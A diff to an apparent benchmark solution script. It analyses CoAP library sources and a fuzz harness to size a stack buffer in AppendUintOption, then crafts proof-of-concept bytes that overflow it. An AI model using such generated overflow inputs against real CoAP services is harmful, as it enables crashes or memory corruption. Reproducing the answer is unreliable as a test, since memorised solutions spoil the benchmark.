@@ -1,350 +1,505 @@
 import os
 import re
 import tarfile
-import tempfile
 from typing import Dict, List, Optional, Tuple
-
-
-def _read_text_file(path: str, max_size: int = 4 * 1024 * 1024) -> Optional[str]:
-    try:
-        st = os.stat(path)
-        if st.st_size > max_size:
-            return None
-        with open(path, "rb") as f:
-            data = f.read()
-        return data.decode("utf-8", "ignore")
-    except Exception:
-        return None
-
-
-def _gather_sources_from_dir(root: str) -> Dict[str, str]:
-    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp", ".tpp", ".m", ".mm"}
-    out: Dict[str, str] = {}
-    for dirpath, _, filenames in os.walk(root):
-        for fn in filenames:
-            ext = os.path.splitext(fn)[1].lower()
-            if ext not in exts:
-                continue
-            path = os.path.join(dirpath, fn)
-            txt = _read_text_file(path)
-            if txt is None:
-                continue
-            rel = os.path.relpath(path, root)
-            out[rel] = txt
-    return out
-
-
-def _gather_sources_from_tar(tar_path: str) -> Dict[str, str]:
-    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp", ".tpp", ".m", ".mm"}
-    out: Dict[str, str] = {}
-    with tarfile.open(tar_path, "r:*") as tf:
-        for m in tf.getmembers():
-            if not m.isfile():
-                continue
-            name = m.name
-            ext = os.path.splitext(name)[1].lower()
-            if ext not in exts:
-                continue
-            if m.size > 4 * 1024 * 1024:
-                continue
-            try:
-                f = tf.extractfile(m)
-                if f is None:
-                    continue
-                data = f.read()
-                txt = data.decode("utf-8", "ignore")
-                out[name] = txt
-            except Exception:
-                continue
-    return out
-
-
-def _extract_brace_block(text: str, open_brace_idx: int) -> Optional[Tuple[int, int, str]]:
-    if open_brace_idx < 0 or open_brace_idx >= len(text) or text[open_brace_idx] != "{":
-        return None
-
-    i = open_brace_idx
-    depth = 0
-    in_sq = False
-    in_dq = False
-    in_line_comment = False
-    in_block_comment = False
-    esc = False
-
-    start = open_brace_idx
-    while i < len(text):
-        ch = text[i]
-        nxt = text[i + 1] if i + 1 < len(text) else ""
-
-        if in_line_comment:
-            if ch == "\n":
-                in_line_comment = False
-            i += 1
-            continue
-
-        if in_block_comment:
-            if ch == "*" and nxt == "/":
-                in_block_comment = False
-                i += 2
-            else:
-                i += 1
-            continue
-
-        if in_sq:
-            if esc:
-                esc = False
-            elif ch == "\\":
-                esc = True
-            elif ch == "'":
-                in_sq = False
-            i += 1
-            continue
-
-        if in_dq:
-            if esc:
-                esc = False
-            elif ch == "\\":
-                esc = True
-            elif ch == '"':
-                in_dq = False
-            i += 1
-            continue
-
-        if ch == "/" and nxt == "/":
-            in_line_comment = True
-            i += 2
-            continue
-        if ch == "/" and nxt == "*":
-            in_block_comment = True
-            i += 2
-            continue
-
-        if ch == "'":
-            in_sq = True
-            i += 1
-            continue
-        if ch == '"':
-            in_dq = True
-            i += 1
-            continue
-
-        if ch == "{":
-            depth += 1
-        elif ch == "}":
-            depth -= 1
-            if depth == 0:
-                end = i
-                return start, end, text[start : end + 1]
-        i += 1
-
-    return None
-
-
-def _find_function_def(text: str, func_name: str) -> Optional[Tuple[str, str]]:
-    # Try to find a real definition: "AppendUintOption(...){"
-    # Avoid declarations ending with ';'
-    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(([^;]*?)\)\s*\{", re.DOTALL)
-    m = pat.search(text)
-    if not m:
-        return None
-    sig_params = m.group(1)
-    brace_idx = text.find("{", m.end() - 1)
-    blk = _extract_brace_block(text, brace_idx)
-    if not blk:
-        return None
-    _, _, body = blk
-    return sig_params, body
-
-
-def _detect_arrays_in_body(body: str) -> Dict[str, int]:
-    arrays: Dict[str, int] = {}
-    # Basic stack array declarations
-    # e.g., uint8_t buf[4]; char tmp[16];
-    pat = re.compile(
-        r"\b(?:unsigned\s+char|signed\s+char|char|uint8_t|int8_t|uint16_t|int16_t|uint32_t|int32_t|uint64_t|int64_t)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*;"
-    )
-    for m in pat.finditer(body):
-        name = m.group(1)
-        size = int(m.group(2))
-        arrays[name] = size
-    return arrays
-
-
-def _guess_relevant_buffer_size(sig_params: str, body: str) -> int:
-    arrays = _detect_arrays_in_body(body)
-    if not arrays:
-        return 4
-
-    # Prefer arrays used as destination in known unsafe operations
-    dangerous_calls = ["memcpy", "memmove", "strcpy", "strncpy", "sprintf", "vsprintf", "gets"]
-    candidates: List[int] = []
-    for name, sz in arrays.items():
-        for fn in dangerous_calls:
-            if re.search(r"\b" + re.escape(fn) + r"\s*\(\s*" + re.escape(name) + r"\b", body):
-                candidates.append(sz)
-                break
-        # Also look for direct indexing patterns
-        if re.search(r"\b" + re.escape(name) + r"\s*\[\s*\w+\s*\]\s*=", body):
-            candidates.append(sz)
-
-    if candidates:
-        return max(1, min(candidates))
-
-    # Else pick smallest array declared in function as likely temp buffer
-    return max(1, min(arrays.values()))
-
-
-def _detect_fuzz_mode(sources: Dict[str, str]) -> Tuple[str, Optional[str]]:
-    # Returns mode: "provider", "direct_append", "raw_parse", "unknown"
-    fuzzer_files: List[Tuple[str, str]] = []
-    for path, txt in sources.items():
-        if "LLVMFuzzerTestOneInput" in txt:
-            fuzzer_files.append((path, txt))
-
-    if not fuzzer_files:
-        return "unknown", None
-
-    # Prefer one mentioning AppendUintOption
-    fuzzer_files.sort(key=lambda p: ("AppendUintOption" not in p[1], len(p[1])))
-
-    for path, txt in fuzzer_files:
-        # Extract fuzzer function body for analysis
-        idx = txt.find("LLVMFuzzerTestOneInput")
-        if idx < 0:
-            continue
-        m = re.search(r"LLVMFuzzerTestOneInput\s*\([^)]*\)\s*\{", txt[idx:])
-        if not m:
-            continue
-        brace_idx = txt.find("{", idx + m.end() - 1)
-        blk = _extract_brace_block(txt, brace_idx)
-        body = blk[2] if blk else txt
-
-        if "AppendUintOption" in body:
-            if "FuzzedDataProvider" in body:
-                return "provider", path
-            return "direct_append", path
-
-        if "FuzzedDataProvider" in body:
-            return "provider", path
-
-        # Heuristic for raw parse: any call with (data, size)
-        if re.search(r"\(\s*data\s*,\s*size\s*(?:,|\))", body):
-            return "raw_parse", path
-
-    return "unknown", fuzzer_files[0][0]
-
-
-def _encode_coap_option(prev_number: int, number: int, value: bytes) -> bytes:
-    delta = number - prev_number
-    if delta < 0:
-        raise ValueError("Options must be in increasing order")
-
-    def enc_ext(v: int) -> Tuple[int, bytes]:
-        if v < 13:
-            return v, b""
-        if v < 269:
-            return 13, bytes([v - 13])
-        if v < 65805:
-            x = v - 269
-            return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])
-        # Larger than standard, but cap safely
-        # CoAP uses up to 2-byte ext with nibble 14; nibble 15 is reserved.
-        x = 65535 - 269
-        return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])
-
-    dn, de = enc_ext(delta)
-    ln, le = enc_ext(len(value))
-    if dn == 15 or ln == 15:
-        raise ValueError("Invalid option encoding")
-    first = (dn << 4) | ln
-    return bytes([first]) + de + le + value
-
-
-def _craft_coap_message(option_number: int, opt_value_len: int) -> bytes:
-    # CoAP header: Ver=1, Type=CON(0), TKL=0, Code=GET(1), MessageID=0
-    header = bytes([0x40, 0x01, 0x00, 0x00])
-    value = b"A" * opt_value_len
-    opt = _encode_coap_option(0, option_number, value)
-    return header + opt
-
-
-def _extract_min_size_checks(fuzzer_text: str) -> int:
-    # Look for "if (size < N)" patterns
-    mins = []
-    for m in re.finditer(r"\bsize\s*<\s*(\d+)", fuzzer_text):
-        try:
-            mins.append(int(m.group(1)))
-        except Exception:
-            pass
-    return max(mins) if mins else 0
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        if os.path.isdir(src_path):
-            sources = _gather_sources_from_dir(src_path)
-        else:
-            sources = _gather_sources_from_tar(src_path)
+        texts = self._load_sources(src_path)
+        buf_size, value_bits = self._analyze_append_uint_option(texts)
+        overflow_val = self._choose_overflow_value(buf_size, value_bits)
 
-        # Find AppendUintOption implementation to infer buffer size
-        sig_params = ""
-        append_body = ""
-        for _, txt in sources.items():
-            found = _find_function_def(txt, "AppendUintOption")
-            if found:
-                sig_params, append_body = found
+        fuzzer_text = self._find_fuzzer_text(texts)
+        if fuzzer_text is not None and ("FuzzedDataProvider" in fuzzer_text) and ("AppendUintOption" in fuzzer_text):
+            poc = self._build_provider_poc(fuzzer_text, buf_size, value_bits, overflow_val)
+            if poc is not None and len(poc) > 0:
+                return poc
+
+        return self._build_coap_fallback(buf_size)
+
+    def _load_sources(self, src_path: str) -> Dict[str, str]:
+        texts: Dict[str, str] = {}
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    if not self._is_source_file(fn):
+                        continue
+                    p = os.path.join(root, fn)
+                    try:
+                        st = os.stat(p)
+                    except OSError:
+                        continue
+                    if st.st_size > 4_000_000:
+                        continue
+                    try:
+                        with open(p, "rb") as f:
+                            data = f.read()
+                        texts[p] = data.decode("utf-8", errors="ignore")
+                    except OSError:
+                        continue
+            return texts
+
+        try:
+            with tarfile.open(src_path, "r:*") as tf:
+                for m in tf.getmembers():
+                    if not m.isfile():
+                        continue
+                    name = m.name
+                    base = os.path.basename(name)
+                    if not self._is_source_file(base):
+                        continue
+                    if m.size > 4_000_000:
+                        continue
+                    try:
+                        f = tf.extractfile(m)
+                        if f is None:
+                            continue
+                        data = f.read()
+                    except Exception:
+                        continue
+                    texts[name] = data.decode("utf-8", errors="ignore")
+        except Exception:
+            pass
+        return texts
+
+    def _is_source_file(self, filename: str) -> bool:
+        filename = filename.lower()
+        exts = (
+            ".c",
+            ".cc",
+            ".cpp",
+            ".cxx",
+            ".h",
+            ".hh",
+            ".hpp",
+            ".inc",
+            ".ipp",
+            ".m",
+            ".mm",
+        )
+        return filename.endswith(exts)
+
+    def _find_fuzzer_text(self, texts: Dict[str, str]) -> Optional[str]:
+        best = None
+        best_score = -1
+        for _, t in texts.items():
+            if "LLVMFuzzerTestOneInput" not in t:
+                continue
+            score = 0
+            if "FuzzedDataProvider" in t:
+                score += 5
+            if "AppendUintOption" in t:
+                score += 10
+            if "coap" in t.lower():
+                score += 1
+            if score > best_score:
+                best_score = score
+                best = t
+        return best
+
+    def _analyze_append_uint_option(self, texts: Dict[str, str]) -> Tuple[int, int]:
+        buf_size = 4
+        value_bits = 64
+
+        func_text = None
+        for _, t in texts.items():
+            if "AppendUintOption" in t:
+                func_text = t
                 break
 
-        buf_size = 4
-        if append_body:
-            buf_size = _guess_relevant_buffer_size(sig_params, append_body)
-            if buf_size <= 0:
-                buf_size = 4
+        if func_text is None:
+            return buf_size, value_bits
 
-        mode, fuzzer_path = _detect_fuzz_mode(sources)
+        idx = func_text.find("AppendUintOption")
+        if idx < 0:
+            return buf_size, value_bits
 
-        if mode in ("provider", "direct_append"):
-            min_req = 0
-            if fuzzer_path and fuzzer_path in sources:
-                min_req = _extract_min_size_checks(sources[fuzzer_path])
+        sig_start = max(0, func_text.rfind("\n", 0, idx))
+        sig_end = func_text.find("{", idx)
+        if sig_end == -1:
+            sig_end = func_text.find(")", idx)
+        sig = func_text[sig_start:sig_end if sig_end != -1 else idx + 2000]
 
-            # Keep input small-ish; ensure we have enough bytes to satisfy common size checks
-            target_len = max(21, min_req)
-            if target_len < 21:
-                target_len = 21
-            if target_len > 256:
-                target_len = 256
+        sig_l = sig.lower()
+        if "uint32_t" in sig_l and "uint64_t" not in sig_l:
+            value_bits = 32
+        elif "uint64_t" in sig_l:
+            value_bits = 64
+        elif "size_t" in sig_l and "appenduintoption" in sig_l:
+            value_bits = 64
 
-            data = bytearray(b"\xFF" * target_len)
-            # Make first byte small to avoid huge loop counts in some fuzz targets
-            data[0] = 1
-            # Sprinkle some zero bytes to prevent some parsers from rejecting everything too early
-            if target_len >= 8:
-                data[1:4] = b"\x00\x00\x00"
-            return bytes(data)
+        body = self._extract_function_body(func_text, idx)
+        if body:
+            sizes: List[int] = []
+            for m in re.finditer(r"\buint8_t\s+\w+\s*\[\s*([^\]]+?)\s*\]\s*;", body):
+                expr = m.group(1).strip()
+                sz = self._eval_c_size_expr(expr)
+                if sz is not None and 1 <= sz <= 64:
+                    sizes.append(sz)
+            if sizes:
+                candidates = [s for s in sizes if s <= 16]
+                if candidates:
+                    buf_size = min(candidates)
+                else:
+                    buf_size = min(sizes)
 
-        # Raw-parse fallback: craft a CoAP message with an oversized uint option value length
-        # Try common uint option number: Content-Format (12)
-        opt_num = 12
+        return buf_size, value_bits
 
-        # Try to infer an option number literal from call sites (best-effort)
-        # If method-call style is used: ".AppendUintOption(<num>,"
-        lit_nums = []
-        for txt in sources.values():
-            for m in re.finditer(r"\.AppendUintOption\s*\(\s*(\d+)\s*,", txt):
-                try:
-                    n = int(m.group(1))
-                    if 0 <= n <= 2048:
-                        lit_nums.append(n)
-                except Exception:
-                    pass
-        if lit_nums:
-            opt_num = min(lit_nums)
+    def _extract_function_body(self, text: str, name_idx: int) -> str:
+        brace = text.find("{", name_idx)
+        if brace == -1:
+            return ""
+        i = brace
+        depth = 0
+        n = len(text)
+        while i < n:
+            c = text[i]
+            if c == "{":
+                depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    return text[brace : i + 1]
+            i += 1
+        return text[brace:]
 
-        overflow_len = buf_size + 1
-        if overflow_len < 5:
-            overflow_len = 5
-        if overflow_len > 512:
-            overflow_len = 512
+    def _eval_c_size_expr(self, expr: str) -> Optional[int]:
+        expr = expr.strip()
+        if not expr:
+            return None
+        if re.fullmatch(r"\d+", expr):
+            try:
+                return int(expr)
+            except Exception:
+                return None
+        m = re.fullmatch(r"sizeof\s*\(\s*([^)]+?)\s*\)", expr)
+        if m:
+            t = m.group(1).strip()
+            t = t.replace("const", "").replace("volatile", "").strip()
+            t = t.replace("unsigned ", "unsigned_").replace("long long", "long_long").replace("long", "long_")
+            t = t.replace(" ", "")
+            mp = {
+                "uint8_t": 1,
+                "int8_t": 1,
+                "char": 1,
+                "unsigned_char": 1,
+                "uint16_t": 2,
+                "int16_t": 2,
+                "short": 2,
+                "unsigned_short": 2,
+                "uint32_t": 4,
+                "int32_t": 4,
+                "int": 4,
+                "unsigned_int": 4,
+                "long_": 8,
+                "unsigned_long_": 8,
+                "long_long": 8,
+                "unsigned_long_long": 8,
+                "uint64_t": 8,
+                "int64_t": 8,
+                "size_t": 8,
+            }
+            return mp.get(t)
+        return None
 
-        return _craft_coap_message(opt_num, overflow_len)
+    def _choose_overflow_value(self, buf_size: int, value_bits: int) -> int:
+        if buf_size < 1:
+            buf_size = 4
+        target_bit = 8 * buf_size
+        if value_bits > target_bit:
+            return 1 << target_bit
+        return (1 << value_bits) - 1
+
+    def _type_to_size_bits(self, type_str: Optional[str]) -> Tuple[int, int]:
+        if not type_str:
+            return 8, 64
+        t = type_str.strip()
+        t = t.replace("const", "").replace("volatile", "").strip()
+        t = t.replace("unsigned ", "unsigned_").replace("long long", "long_long").replace("long", "long_")
+        t = t.replace(" ", "")
+        mp = {
+            "uint8_t": (1, 8),
+            "int8_t": (1, 8),
+            "char": (1, 8),
+            "unsigned_char": (1, 8),
+            "uint16_t": (2, 16),
+            "int16_t": (2, 16),
+            "short": (2, 16),
+            "unsigned_short": (2, 16),
+            "uint32_t": (4, 32),
+            "int32_t": (4, 32),
+            "int": (4, 32),
+            "unsigned_int": (4, 32),
+            "long_": (8, 64),
+            "unsigned_long_": (8, 64),
+            "long_long": (8, 64),
+            "unsigned_long_long": (8, 64),
+            "uint64_t": (8, 64),
+            "int64_t": (8, 64),
+            "size_t": (8, 64),
+            "bool": (1, 8),
+        }
+        return mp.get(t, (8, 64))
+
+    def _parse_int_literal(self, s: str) -> Optional[int]:
+        s = s.strip()
+        if not s:
+            return None
+        s = re.sub(r"[uUlL]+$", "", s)
+        s = s.strip()
+        try:
+            return int(s, 0)
+        except Exception:
+            return None
+
+    def _split_args(self, s: str) -> List[str]:
+        args = []
+        depth = 0
+        cur = []
+        i = 0
+        while i < len(s):
+            c = s[i]
+            if c == "(":
+                depth += 1
+                cur.append(c)
+            elif c == ")":
+                depth -= 1
+                cur.append(c)
+            elif c == "," and depth == 0:
+                args.append("".join(cur).strip())
+                cur = []
+            else:
+                cur.append(c)
+            i += 1
+        tail = "".join(cur).strip()
+        if tail:
+            args.append(tail)
+        return args
+
+    def _build_provider_poc(self, fuzzer_text: str, buf_size: int, value_bits: int, overflow_val: int) -> Optional[bytes]:
+        mprov = re.search(r"\bFuzzedDataProvider\s+(\w+)\s*\(", fuzzer_text)
+        prov = mprov.group(1) if mprov else "provider"
+
+        idx_f = fuzzer_text.find("LLVMFuzzerTestOneInput")
+        if idx_f == -1:
+            idx_f = 0
+        idx_call = fuzzer_text.find("AppendUintOption", idx_f)
+        if idx_call == -1:
+            return None
+
+        call_start = fuzzer_text.find("AppendUintOption", idx_call)
+        paren = fuzzer_text.find("(", call_start)
+        if paren == -1:
+            return None
+        end = self._find_matching_paren(fuzzer_text, paren)
+        if end == -1:
+            return None
+        call_args_str = fuzzer_text[paren + 1 : end]
+        args = self._split_args(call_args_str)
+        if len(args) < 2:
+            return None
+
+        prefix = fuzzer_text[idx_f : end + 1]
+
+        consume_re = re.compile(
+            rf"\b{re.escape(prov)}\s*\.\s*(ConsumeIntegralInRange|ConsumeIntegral|ConsumeBool)\s*(?:<\s*([^>]+?)\s*>\s*)?\(\s*([^\)]*)\)",
+            re.S,
+        )
+
+        actions: List[dict] = []
+        var_to_action_idx: Dict[str, int] = {}
+
+        for m in consume_re.finditer(prefix):
+            method = m.group(1)
+            tstr = m.group(2)
+            argstr = m.group(3) if m.group(3) is not None else ""
+            stmt_start = prefix.rfind(";", 0, m.start())
+            if stmt_start == -1:
+                stmt_start = prefix.rfind("{", 0, m.start())
+            if stmt_start == -1:
+                stmt_start = prefix.rfind("\n", 0, m.start())
+            if stmt_start == -1:
+                stmt_start = 0
+            stmt = prefix[stmt_start + 1 : m.end()]
+            vname = None
+            am = re.search(r"\b(\w+)\s*=\s*" + re.escape(prov) + r"\s*\.\s*" + re.escape(method), stmt)
+            if am:
+                vname = am.group(1)
+
+            size, bits = self._type_to_size_bits(tstr if method != "ConsumeBool" else "bool")
+            a = {
+                "method": method,
+                "type": tstr,
+                "size": size,
+                "bits": bits,
+                "range": None,
+                "want": None,
+                "vname": vname,
+                "span": (m.start(), m.end()),
+            }
+
+            if method == "ConsumeIntegralInRange":
+                parts = self._split_args(argstr)
+                if len(parts) >= 2:
+                    lo = self._parse_int_literal(parts[0])
+                    hi = self._parse_int_literal(parts[1])
+                    if lo is not None and hi is not None:
+                        if lo > hi:
+                            lo, hi = hi, lo
+                        a["range"] = (lo, hi)
+
+            actions.append(a)
+            if vname:
+                var_to_action_idx[vname] = len(actions) - 1
+
+        # Determine which action corresponds to option number and value
+        target_num_idx = None
+        target_val_idx = None
+
+        num_expr = args[0].strip()
+        val_expr = args[1].strip()
+
+        def find_action_for_expr(expr: str) -> Optional[int]:
+            m2 = consume_re.search(expr)
+            if m2:
+                # Find matching action by span within prefix: use last consume occurrence with identical text near end.
+                # Fallback: choose last action with same method+type.
+                method = m2.group(1)
+                tstr = m2.group(2)
+                for i in range(len(actions) - 1, -1, -1):
+                    if actions[i]["method"] == method and actions[i]["type"] == tstr:
+                        return i
+                return None
+            mid = re.fullmatch(r"\b([A-Za-z_]\w*)\b", expr)
+            if mid:
+                v = mid.group(1)
+                if v in var_to_action_idx:
+                    return var_to_action_idx[v]
+            return None
+
+        target_num_idx = find_action_for_expr(num_expr)
+        target_val_idx = find_action_for_expr(val_expr)
+
+        if target_num_idx is None or target_val_idx is None:
+            # try common variable names
+            for cand in ("number", "option", "opt", "optionNumber", "aNumber"):
+                if target_num_idx is None and cand in var_to_action_idx:
+                    target_num_idx = var_to_action_idx[cand]
+            for cand in ("value", "val", "optionValue", "aValue"):
+                if target_val_idx is None and cand in var_to_action_idx:
+                    target_val_idx = var_to_action_idx[cand]
+
+        if target_num_idx is None or target_val_idx is None:
+            # fall back to last two integral consumes
+            integral_idxs = [i for i, a in enumerate(actions) if a["method"] != "ConsumeBool"]
+            if len(integral_idxs) >= 2:
+                target_num_idx = integral_idxs[-2]
+                target_val_idx = integral_idxs[-1]
+            else:
+                return None
+
+        # Assign default wants (small) to all actions to take paths without huge loops.
+        for i, a in enumerate(actions):
+            if a["method"] == "ConsumeBool":
+                a["want"] = 1
+            else:
+                a["want"] = 1
+
+        # Set option number and value wants
+        actions[target_num_idx]["want"] = 14
+
+        val_action = actions[target_val_idx]
+        _, vbits = val_action["size"], val_action["bits"]
+        vtarget = overflow_val
+        # Ensure vtarget fits representable bits while still likely overflowing
+        if vbits < 64:
+            vmax = (1 << vbits) - 1
+            if vtarget > vmax:
+                vtarget = vmax
+        val_action["want"] = vtarget
+
+        # Build bytes in consume order
+        out = bytearray()
+        for a in actions:
+            size = int(a["size"])
+            want = int(a["want"]) if a["want"] is not None else 0
+            method = a["method"]
+            if method == "ConsumeBool":
+                out.append(want & 0x01)
+                continue
+
+            rng = a["range"]
+            if rng is not None:
+                lo, hi = rng
+                if want < lo:
+                    want = lo
+                elif want > hi:
+                    want = hi
+                raw = want - lo
+            else:
+                raw = want
+
+            max_raw = (1 << (8 * size)) - 1
+            raw &= max_raw
+            out += int(raw).to_bytes(size, "little", signed=False)
+
+        # Ensure minimal non-empty; optionally pad a tiny bit if too short
+        if len(out) == 0:
+            return None
+        return bytes(out)
+
+    def _find_matching_paren(self, s: str, open_idx: int) -> int:
+        depth = 0
+        i = open_idx
+        while i < len(s):
+            c = s[i]
+            if c == "(":
+                depth += 1
+            elif c == ")":
+                depth -= 1
+                if depth == 0:
+                    return i
+            i += 1
+        return -1
+
+    def _build_coap_fallback(self, buf_size: int) -> bytes:
+        # Construct a plausible CoAP message (21-ish bytes) with a uint option value requiring (buf_size+1) bytes.
+        if buf_size < 1:
+            buf_size = 4
+        value_len = buf_size + 1
+        value_bytes = b"\x01" + (b"\x00" * buf_size)  # big-endian encoding of 1 << (8*buf_size)
+
+        # CoAP header: ver=1, type=CON(0), tkl=8
+        token = b"\x00" * 8
+        header = bytes([0x40 | 0x08, 0x01, 0x00, 0x01])  # GET, msgid=1
+
+        # Option: Max-Age (14), delta=14 from 0
+        option_number = 14
+        prev = 0
+        opt = self._encode_coap_option(option_number - prev, value_bytes)
+
+        msg = header + token + opt
+        # Pad to 21 bytes with payload marker + small payload if needed
+        if len(msg) < 21:
+            need = 21 - len(msg)
+            if need >= 1:
+                # Add payload marker and payload bytes
+                payload = b"A" * max(0, need - 1)
+                msg = msg + b"\xFF" + payload
+            if len(msg) < 21:
+                msg = msg + (b"\x00" * (21 - len(msg)))
+        return msg
+
+    def _encode_coap_option(self, delta: int, value: bytes) -> bytes:
+        def enc_nibble(x: int) -> Tuple[int, bytes]:
+            if x < 13:
+                return x, b""
+            if x < 269:
+                return 13, bytes([x - 13])
+            return 14, int(x - 269).to_bytes(2, "big", signed=False)
+
+        d_n, d_ext = enc_nibble(delta)
+        l_n, l_ext = enc_nibble(len(value))
+        first = bytes([(d_n << 4) | l_n])
+        return first + d_ext + l_ext + value
